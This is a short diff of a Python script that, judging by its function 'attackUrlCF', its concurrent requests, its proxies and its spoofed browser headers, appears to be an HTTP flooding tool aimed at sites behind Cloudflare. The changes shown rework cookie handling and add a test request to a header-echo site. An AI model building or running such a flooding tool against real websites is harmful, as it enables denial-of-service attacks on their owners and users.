@@ -6,7 +6,7 @@ import string
 import time
 import grequests
 import requests
-
+import http.cookiejar
 
 def prepare_cookies(self, cookies):
 	pass
@@ -107,14 +107,28 @@ def attackUrlCF(baseUrl, threadNumber):
 			'Accept-Encoding': 'gzip, deflate, br',
 			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',	
 			'User-Agent': userAgent,
-			'Cookie': cookiesStr,
+			# 'Cookie': cookiesStr,
+			'Cookie1': cookiesStr,
 			'Connection': 'keep-alive',
 			'Upgrade-Insecure-Requests': '1',
 			}
 
 			# checkIp()
 			print(proxies, headers)
-			print(requests.get('http://www.xhaus.com/headers', headers=headers, cookies=cookiesStr).content)
+			cookies = cookiesStr.split(";")
+			cj = http.cookiejar.CookieJar()
+
+			for c in cookies:
+				k,v = c.split("=")
+				cookie = http.cookiejar.Cookie(None, k, v, None, False, "", 
+												False, "", "",
+												False,False, False,False,
+												False,
+												"",
+												"",None)
+
+				cj.set_cookie(cookie)
+			print(requests.get('http://www.xhaus.com/headers', headers=headers, cookies=cj).content)
 			
 			# print(requests.get('http://myhttpheader.com/' , headers=headers, proxies=proxies).content)
 			# input()
